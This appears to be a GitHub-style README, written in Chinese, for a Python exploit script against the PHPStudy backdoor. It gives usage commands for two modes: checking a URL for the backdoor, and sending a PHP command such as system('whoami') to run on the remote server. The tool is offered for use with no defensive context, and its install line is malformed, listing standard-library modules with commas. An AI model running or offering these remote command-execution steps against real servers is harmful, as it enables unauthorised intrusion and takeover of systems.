# PHPStudyBackDoorExp
PHPStudy后门事件 EXP Python3 利用脚本

# 使用方法
```
python3 -m pip install requests, random, base64

有两种利用模式, 一种是单纯检测是否有漏洞, 一种是执行用户输入命令

单纯检测是否有漏洞
python3 run.py -u "http://test.com/index.php"

执行用户输入命令
python3 run.py -u "http://test.com/index.php" -c "system('whoami');"
```

# 注意
index.php 要替换为任意可访问到的php文件, 必须填写完整!
